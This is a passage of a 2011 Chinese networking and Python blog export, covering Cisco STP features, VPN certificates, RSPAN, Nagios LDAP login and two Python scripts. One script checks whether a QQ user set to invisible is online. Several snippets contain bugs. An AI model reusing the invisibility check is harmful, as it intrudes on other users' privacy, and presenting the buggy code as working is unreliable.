STP: VLAN0001 Fa0/1 -&gt; learning    01:45:57: STP: VLAN0001 sent Topology Change Notice on Fa0/19    01:45:57: STP: VLAN0001 Fa0/1 –&gt; forwarding</p>  <p><strong>3 UplinkFast 当一个交换机的一条上行链路出现故障时，uplinkfast使得这个交换机可以快速切换到另一条链路</strong></p>  <p>spanning-tree uplinkfast&#160; //配置在接入交换机上</p>  <p>SW1#show spanning-tree vlan 1   VLAN0001    Spanning tree enabled protocol ieee    Root ID Priority 32769    Address 000e.83b2.9480    Cost 3019    Port 21 (FastEthernet0/19)    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Bridge ID Priority 49153 (priority 49152 sys-id-ext 1)    Address 0016.4639.d580    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Aging Time 300    Uplinkfast enabled    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/1 Desg FWD 3019 128.3 P2p    Fa0/2 Desg FWD 3019 128.4 P2p    Fa0/3 Desg FWD 3100 128.5 Shr    Fa0/4 Desg FWD 3100 128.6 Shr    Fa0/5 Desg FWD 3100 128.7 Shr    Fa0/6 Desg FWD 3019 128.8 P2p    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/13 Altn BLK 3019 128.15 P2p    Fa0/19 Root FWD 3019 128.21 P2p    Fa0/24 Desg FWD 3100 128.26 Shr    SW1#debug spanning-tree uplinkfast    Spanning Tree uplinkfast debugging is on    SW1#conf t    Enter configuration commands, one per line. End with CNTL/Z.    SW1(config)#int fa 0/19    SW1(config-if)#shut    SW1(config-if)#    00:13:29: STP FAST: UPLINKFAST: make_forwarding on VLAN0001 FastEthernet0/13    root port id new: 128.15 prev: 128.21    00:13:29: %SPANTREE_FAST-7-PORT_FWD_UPLINK: VLAN0001 FastEthernet0/13 moved to    Forwarding (UplinkFast).    00:13:29: STP FAST: make_forwarding: via UPLINKFAST: NOT: port FastEthernet0/1    VLAN0001 is: uplink enabled new root FastEthernet0/13 (not me)prev root    exists(8015/FastEthernet0/19) cur state forwarding role uplink    00:13:29: STP FAST: make_forwarding: via UPLINKFAST: NOT: port FastEthernet0/2    VLAN0001 is: uplink enabled new root FastEthernet0/13 (not me)prev root    exists(8015/FastEthernet0/19) cur state forwarding role uplink    &lt;output omitted&gt;    00:13:31: %LINK-5-CHANGED: Interface FastEthernet0/19, changed state to    administratively down    00:13:32: %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/19,    changed state to down    SW1(config-if)#^Z    SW1#show spanning vlan 1    VLAN0001    Spanning tree enabled protocol ieee    Root ID Priority 32769    Address 000e.83b2.9480    Cost 3057    Port 15 (FastEthernet0/13)    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Bridge ID Priority 49153 (priority 49152 sys-id-ext 1)    Address 0016.4639.d580    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Aging Time 15    Uplinkfast enabled    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/1 Desg FWD 3019 128.3 P2p    Fa0/2 Desg FWD 3019 128.4 P2p    Fa0/3 Desg FWD 3100 128.5 Shr    Fa0/4 Desg FWD 3100 128.6 Shr    Fa0/5 Desg FWD 3100 128.7 Shr    Fa0/6 Desg FWD 3019 128.8 P2p    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/13 Root FWD 3019 128.15 P2p    Fa0/24 Desg FWD 3100 128.26 Shr</p>  <p><strong>4 BackboneFast 是对UplinkFast的一种补充，UplinkFast能够检测直连链路的失效，BackboneFast是用来检测间接链路的失效。当启用了BackboneFast的交换机检测到间接链路失效之后，会马上使阻塞的端口进入监听状态，少了20S的老化时间</strong></p>  <p>spanning-tree backbonefast   spanning-tree vlan 1 root primary</p>  <p>链路故障前：   SW3#show spanning-tree vlan 1    VLAN0001    Spanning tree enabled protocol ieee    Root ID Priority 24577    Address 0016.4639.d580    Cost 38    Port 19 (FastEthernet0/19)    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Bridge ID Priority 32769 (priority 32768 sys-id-ext 1)    Address 0015.63c8.8800    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Aging Time 300    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/16 Altn BLK 19 128.16 P2p    Fa0/19 Root FWD 19 128.19 P2p    出现故障之后：    SW3#debug spanning-tree events    Spanning Tree event debugging is on    SW3#debug spanning-tree backbonefast detail    Spanning Tree backbonefast detail debugging is on    SW1(config)#interface FastEthernet 0/19    SW1(config-if)#shutdown    SW3#    17:10:02: STP: VLAN0001 heard root 32769-000e.83b2.9480 on Fa0/19    17:10:02: STP FAST: received inferior BPDU on VLAN0001 FastEthernet0/19.    17:10:02: STP FAST: sending RLQ request PDU on VLAN0001(1) Fa0/16 Vlan1    17:10:02: STP FAST: Received RLQ response PDU on VLAN0001 FastEthernet0/16.    17:10:02: STP FAST: received RLQ response PDU was expected on VLAN0001    FastEthernet0/16 - resp root id 24577-0016.4639.d580 .    17:10:02: STP FAST: received_rlq_bpdu on VLAN0001 FastEthernet0/19 - making    FastEthernet0/19 a designated port    17:10:02: STP: VLAN0001 new root port Fa0/16, cost 38    17:10:02: STP: VLAN0001 Fa0/16 -&gt; listening    17:10:03: STP: VLAN0001 Topology Change rcvd on Fa0/19    17:10:03: STP: VLAN0001 sent Topology Change Notice on Fa0/16    17:10:17: STP: VLAN0001 Fa0/16 -&gt; learning    17:10:32: STP: VLAN0001 sent Topology Change Notice on Fa0/16    17:10:32: STP: VLAN0001 Fa0/16 -&gt; forwarding    SW3#show spanning-tree vlan 1    VLAN0001    Spanning tree enabled protocol ieee    Root ID Priority 24577    Address 0016.4639.d580    Cost 38    Port 16 (FastEthernet0/16)    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Bridge ID Priority 32769 (priority 32768 sys-id-ext 1)    Address 0015.63c8.8800    Hello Time 2 sec Max Age 20 sec Forward Delay 15 sec    Aging Time 300    Interface Role Sts Cost Prio.Nbr Type    ---------------- ---- --- --------- -------- --------------------------------    Fa0/16 Root FWD 19 128.16 P2p    Fa0/19 Desg FWD 19 128.19 P2p</p>  <p><strong>5 BPDU Guard 如果PortFast接口上收到BPDU，则该接口会被禁用</strong></p>  <p>interface FastEthernet 0/1   spanning-tree bpduguard enable</p>  <p>SW1#show spanning-tree interface fa0/1 detail   Port 3 (FastEthernet0/1) of VLAN0001 is forwarding    Port path cost 19, Port priority 128, Port Identifier 128.3.    Designated root has priority 24577, address 0016.4639.d580    Designated bridge has priority 24577, address 0016.4639.d580    Designated port id is 128.3, designated path cost 0    Timers: message age 0, forward delay 0, hold 0    Number of transitions to forwarding state: 1    Link type is point-to-point by default    Bpdu guard is enabled    BPDU: sent 2176, received 0    BPDUs are still sent to this port:    SW1#show spanning-tree interface fa0/1 detail    Port 3 (FastEthernet0/1) of VLAN0001 is forwarding    Port path cost 19, Port priority 128, Port Identifier 128.3.    Designated root has priority 24577, address 0016.4639.d580    Designated bridge has priority 24577, address 0016.4639.d580    Designated port id is 128.3, designated path cost 0    Timers: message age 0, forward delay 0, hold 0    Number of transitions to forwarding state: 1    Link type is point-to-point by default    Bpdu guard is enabled    BPDU: sent 2180, received 0    Configure R1 to produce BPDUs:    SW1#debug spanning-tree events    R1:    interface FastEthernet 0/0    no shutdown    no ip address    bridge-group 1    exit    !    bridge 1 protocol ieee    bridge 1 priority 4096    SW1#    %SPANTREE-2-BLOCK_BPDUGUARD: Received BPDU on port FastEthernet0/1 with BPDU    Guard enabled. Disabling port.    %PM-4-ERR_DISABLE: bpduguard error detected on Fa0/1, putting Fa0/1 in errdisable    state    %LINEPROTO-5-UPDOWN: Line protocol on Interface FastEthernet0/1, changed state    to down    %LINK-3-UPDOWN: Interface FastEthernet0/1, changed state to down    SW1#show interfaces fa0/1    FastEthernet0/1 is down, line protocol is down (err-disabled)    Hardware is Fast Ethernet, address is 0016.4639.d583 (bia 0016.4639.d583)    MTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,    reliability 255/255, txload 1/255, rxload 1/255    Encapsulation ARPA, loopback not set    Keepalive set (10 sec)    Auto-duplex, Auto-speed, media type is 10/100BaseTX    input flow-control is off, output flow-control is unsupported    ARP type: ARPA, ARP Timeout 04:00:00    Last input 00:03:06, output 00:03:07, output hang never    Last clearing of &quot;show interface&quot; counters never    Input queue: 0/75/0/0 (size/max/drops/flushes); Total output drops: 0    Queueing strategy: fifo    Output queue: 0/40 (size/max)    5 minute input rate 0 bits/sec, 0 packets/sec    5 minute output rate 453000 bits/sec, 151 packets/sec    560 packets input, 63434 bytes, 0 no buffer    Received 88 broadcasts (0 multicast)    0 runts, 0 giants, 0 throttles    0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored    0 watchdog, 87 multicast, 0 pause input    0 input packets with dribble condition detected    17931976 packets output, 1847207828 bytes, 0 underruns    0 output errors, 0 collisions, 1 interface resets    0 babbles, 0 late collision, 0 deferred    0 lost carrier, 0 no carrier, 0 PAUSE output    0 output buffer failures, 0 output buffers swapped out</p></p>\n",
    "date": {
      "year": "2011",
      "month": "June",
      "day": "23"
    }
  },
  {
    "id": 72,
    "title": "python 发送中文邮件",
    "category": "python",
    "tags": [
      "python邮件"
    ],
    "url": "/archives/pythonfasongyoujian/",
    "content": "<p>发送邮件直接参考本文</p>\n\n<p>mail_server = 'mail@dongwm.com'\nmail_server_port = 25\nmail_user='ops@dongwm.com'\nmail_list = ['dongwm@dongwm.com','XXX@dongwm.com']\nsub='邮件标题内容‘</p>\n\n<p>content='邮件内容'</p>\n\n<p>def send_mail(mail_list,sub,content):\nmsg=email.MIMEText.MIMEText(content,_subtype='plain',_charset='gb2312')\nmsg['Subject'] = sub\nmsg['From'] = 'ops@dongwm.com'\nmsg['To'] = \";\".join(mail_list)\nmsg['date']=time.ctime()\nme = mail_user+'&lt;'+mail_user+'@'+'dongwm.com+'&gt;'\nbody=email.MIMEText.MIMEText(content,_charset='gb2312')\nbb =msg.as_string()+body.as_string()\ns = smtplib.SMTP(mail_server, mail_server_port)\ns.sendmail(me,mail_list,msg.as_string())\ns.quit()</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "08"
    }
  },
  {
    "id": 73,
    "title": "python脚本实现查看某QQ号码是否在线（揪出隐身）",
    "category": "python",
    "tags": [
      "发现隐身QQ"
    ],
    "url": "/archives/pythonjiaobenshixianchakanmouqqhaomashifouzaixianjiuchuyinshen/",
    "content": "<p><pre class=\"sh_python\">\n#!/bin/env python\n# coding=utf-8</p>\n\n<p>import string\nimport time\nimport datetime\nimport urllib2</p>\n\n<p>try:\n    verify = raw_input('请输入QQ号码')\nexcept KeyboardInterrupt:\n    pass\ndef check_qq(verify):\n    if verify.isdigit():\n       checkurl = 'http://wpa.qq.com/pa?p=1:\"+verify+\":1'\n       c = urllib2.urlopen(checkurl)\n       length=c.headers.get(\"content-length\")\n       c.close()\n    print datetime.datetime.now()\n    if length=='2329':\n        return 'Online'\n    elif length=='2262':\n        return 'Offline'\n    else:\n        return 'Unknown Status!'\nif __name__ == '__main__':\n    check_qq(verify)\n    print 'qq ' + 'is '+ check_qq(verify)\n</pre></p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "08"
    }
  },
  {
    "id": 74,
    "title": "站到站VPN (数字证书)",
    "category": "vpn",
    "tags": [
      "数字证书"
    ],
    "url": "/archives/kongzhipingmianheguanlipingmiananquan/",
    "content": "<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R3 </strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>上的</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>VLAN</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>配置</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\">VLAN0035 Fa0/3, Fa0/5</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R3</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>配置</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>(CA)</strong></span></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3#</span><span style=\"font-family: Arial,sans-serif;\"><strong>clock set 18:00:00 8 Aug 2008</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3#</span><span style=\"font-family: Arial,sans-serif;\"><strong>conf t</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int vlan35</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.12.35 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip domain-name dongwm.com</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto pki server vpnca</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(cs-server)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>grant auto</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(cs-server)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>no shutdown</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">%Some server settings cannot be changed after CA certificate generation.</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Please enter a passphrase to protect the private key</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% or type Return to exit</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Password:</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>cisco123</strong></span></span></span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Re-enter password:</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>cisco123</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Generating 1024 bit RSA keys, keys will be non-exportable...[OK]</span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Aug 8 18:08:00.395: %SSH-5-ENABLED: SSH 1.99 has been enabled% Exporting</span><span style=\"font-family: Arial,sans-serif;\">Certificate Server signing certificate and keys...</span></span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Certificate Server enabled.</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3(cs-server)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>end</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R3#sh crypto key mypubkey rsa </span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Key pair was generated at: 18:08:00 UTC Aug 8 2008</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key name: vpnca</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Usage: General Purpose Key</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key is not exportable.</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key Data:</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">30819F30 0D06092A 864886F7 0D010101 05000381 8D003081 89028181 00D91167 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">FCA77211 274A2CFC B6CE878E A5015E1C 0AC2F338 453D38B6 691A2B66 8B026E06 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">F08707E8 A87383B7 A4A81638 3A31F66A AFE95C19 E3FD70EE 6BD712EF 0BDD4B67 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">0424F121 81EB3C38 B0C16178 FAC05C47 5FA33A7F 93462187 3FE30098 920A0784 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">268F290F 3E7C0771 CBCC4B53 0CC09D4F 63A7F0E1 E849800C 619EA02F BD020301 0001</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Key pair was generated at: 18:08:01 UTC Aug 8 2008</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key name: vpnca.server</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Usage: Encryption Key</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key is not exportable.</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Key Data:</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">307C300D 06092A86 4886F70D 01010105 00036B00 30680261 00D0C4D2 102FDD65 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">53599D63 8689E105 17F85939 6D0E415A 0BE183AE 32435875 6650B178 4D213B10 </span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">B5ECD8F3 7210CDB5 A6714F8A 3E010F6B 02B3A10D F1779DBA 551CFF2A E67F1062 </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">E30A163C 0AE61978 A4157C71 A0DF544C 31E807F7 5F549181 F3020301 0001</span></span></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>R1</strong></span></span></span></span><span style=\"color: #c00000;\"><span style=\"font-size: medium;\"><strong>配置</strong></span><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\"><span style=\"font-size: medium;\"><strong>(VPN)</strong></span></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int loopback 0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 1.1.1.1 255.255.255.255</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>int e1/0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>no sh</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip add 192.168.12.1 255.255.255.0</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-if)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>ip route 0.0.0.0 0.0.0.0 192.168.12.2</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>ip host vpnca 192.168.12.35</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1#</span><span style=\"color: #7030a0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>clock set 18:00:00 8 Aug 2008</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto pki trustpoint vpnca</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(ca-trustpoint)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>password cisco123</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(ca-trustpoint)#</span><span style=\"color: #c00000;\"><span style=\"font-family: Arial,sans-serif;\"><strong>enrollment url http://vpnca</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(ca-trustpoint)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>exit</strong></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto pki authenticate vpnca</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Certificate has the following attributes:</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Fingerprint MD5: 1891DCB9 B7896D96 F135D835 B4DB2A3B </span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Fingerprint SHA1: 96249CAB FE0F8666 5420BEBE E6351C77 C036A563</span></span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">% Do you accept this certificate? [yes/no]:</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>yes</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">Trustpoint CA certificate accepted.</span></p>\n\n<p><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>R1(config)#crypto pki enroll vpnca</strong></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">%</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Start certificate enrollment .. </span></p>\n\n<p>&nbsp;</p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% The subject name in the certificate will include: R1.cisco.com</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">% Include the router serial number in the subject name? [yes/no]:</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>yes</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% The serial number in the certificate will be: 4294967295</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">% Include an IP address in the subject name? [no]:</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>yes</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Enter Interface name or IP Address[]:</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>192.168.12.1</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">Request certificate from CA? [yes/no]:</span><span style=\"color: #00b050;\"><span style=\"font-family: Arial,sans-serif;\"><strong>yes</strong></span></span></span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% Certificate request sent to Certificate Authority</span></p>\n\n<p><span style=\"font-family: Arial,sans-serif;\">% The 'show crypto pki certificate verbose vpnca' commandwill show the fingerprint.</span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>crypto isakmp policy 10</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"color: #0070c0;\"><span style=\"font-family: Arial,sans-serif;\"><strong>authentication rsa-sig</strong></span></span></span></p>\n\n<p><span style=\"font-family: Times New Roman,serif;\"><span style=\"font-family: Arial,sans-serif;\">R1(config-isakmp)#</span><span style=\"font-family: Arial,sans-serif;\"><strong>end</strong></span></span></p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "10"
    }
  },
  {
    "id": 75,
    "title": "远程端口镜像",
    "category": "思科",
    "tags": [
      "rspan",
      "远程端口镜像"
    ],
    "url": "/archives/yuanchengduankoujingxiang/",
    "content": "<p>目前许多局域网环境是由多台交换机组成的，SPAN对话只能对本交换机内的数据进行捕获，而其他交换机上的数据则无法获得。Cisco公司针对这种情况开发了远程SPAN（RSPAN）功能，能够对远端交换机的数据进行监视。以下实验实现：1 配置vlan100为rspanvlan 2 将所有sw1的lan13的流量定向到vlan100  3 将rspan vlan100的流量定向到sw2的f0/6</p>\n\n<p>SW1#vlan database\nSW1(vlan)#vlan 100\nVLAN 100 added:\nName: VLAN0100\nSW1(vlan)#vlan 13\nVLAN 13 added:\nName: VLAN0013\nSW1(vlan)#exit\nAPPLY completed.\nExiting....\nSW1#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.</p>\n\n<p>&nbsp;</p>\n\n<p>SW1(config)#vlan 100</p>\n\n<p>SW1(config-vlan)#remote-span</p>\n\n<p>SW1(config)#int range f0/1 -3\nSW1(config-if-range)#switch access vlan 13\nSW1(config-if-range)#exit\nSW1(config)#monitor session 1 source vlan 13 rx\nSW1(config)#monitor session 1 destination remote vlan 100 reflector-port Gi0/1</p>\n\n<p>SW2#vlan database\nSW2(vlan)#vlan 100\nVLAN 100 added:\nName: VLAN0100\nSW2(vlan)#exit\nAPPLY completed.\nExiting....\nSW2#conf t\nEnter configuration commands, one per line.  End with CNTL/Z.</p>\n\n<p>SW2(config)#vlan 100</p>\n\n<p>SW2(config-vlan)#remote-span</p>\n\n<p>SW2(config)#monitor session 1 destination interface Fa0/6\nSW2(config)#monitor session 1 source remote vlan 100</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "13"
    }
  },
  {
    "id": 76,
    "title": "使nagios使用LDAP帐号密码登录",
    "category": "nagios",
    "tags": [
      "naigos ldap"
    ],
    "url": "/archives/%E4%BD%BFnagios%E4%BD%BF%E7%94%A8ldap%E5%B8%90%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95/",
    "content": "<p>生产环境中使用了LDAP的OSS（单点登录），后来觉得nagios也就放到了ldap里面。</p>\n\n<p>1修改apache配置文件/etc/httpd/conf.d/nagios.conf\n&lt;VirtualHost *:6060&gt;\nDocumentRoot /ops/dongwm/nagios/share\nServerName nagios.dongwm.com</p>\n\n<p>ScriptAlias /nagios/cgi-bin \"/ops/dongwm/nagios/sbin\"</p>\n\n<p>&lt;Directory \"/ops/dongwm/nagios/sbin\"&gt;\nOptions ExecCGI\nAllowOverride None\nOrder allow,deny\nAllow from all</p>\n\n<p>AuthType Basic\nAuthBasicProvider ldap\nAuthName \"Please input user info:\"\nAuthzLDAPAuthoritative off\nAuthLDAPURL ldap://你的ldap服务器IP/cn=Manager,dc=你的域名,dc=com?uid?sub?(objectClass=*)\nRequire ldap-user dongwm dongwm1\n&lt;/Directory&gt;</p>\n\n<p>Alias /nagios \"/opt/dongwm/nagios/share\"</p>\n\n<p>&lt;Directory \"/opt/dongwm/nagios/share\"&gt;\nOptions None\nAllowOverride None\nOrder allow,deny\nAllow from all</p>\n\n<p>AuthType Basic\nAuthBasicProvider ldap\nAuthName \"Please input user info:\"\nAuthzLDAPAuthoritative off\nAuthLDAPURL ldap://你的ldap服务器IP/cn=Manager,dc=你的域名,dc=com?uid?sub?(objectClass=*)\nRequire ldap-user dongwm dongwm1\n&lt;/Directory&gt;\n2  修改nagios.conf的权限为apache用户 文件属性400\n3  增加apache的ldap模块\nLoadModule ldap_module modules/mod_ldap.so\nLoadModule authnz_ldap_module modules/mod_authnz_ldap.so</p>\n",
    "date": {
      "year": "2011",
      "month": "July",
      "day": "14"
    }
  },
  {
    "id": 77,
